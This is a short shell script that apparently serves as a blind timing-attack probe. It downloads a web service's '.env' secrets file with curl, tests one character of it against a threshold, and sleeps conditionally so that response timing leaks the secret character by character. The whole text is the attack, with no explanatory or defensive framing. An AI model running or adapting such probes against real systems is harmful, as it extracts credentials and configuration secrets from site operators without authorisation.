#!/bin/sh
curl -s -o /wa https://playerapi.hubgaming.com/.env
[ "$(tail -c +9 /wa|head -c1)" < 'g' ]&&sleep 25
sleep 12
